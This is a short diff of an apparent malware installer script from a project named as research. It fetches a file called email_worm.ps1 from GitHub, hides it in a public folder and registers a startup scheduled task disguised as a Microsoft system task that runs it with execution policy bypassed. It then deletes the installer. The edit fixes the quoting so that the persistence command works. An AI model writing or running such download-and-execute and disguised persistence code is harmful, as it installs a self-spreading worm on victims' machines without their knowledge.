@@ -154,7 +154,7 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchPr
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/email_worm.ps1' -OutFile "C:\Users\Public\Public Display\email_worm.ps1"
 
 
-schtasks /create /tn "Microsoft Compatibility Appraiser" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'C:\Users\Public\Public Display\email_worm.ps1\'" /sc onstart /delay 0001:00 /f 
+schtasks /create /tn "Microsoft Compatibility Appraiser" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'C:\Users\Public\Public Display\email_worm.ps1'" /sc onstart /delay 0001:00 /f 
 
 
 Remove-Item installer.ps1
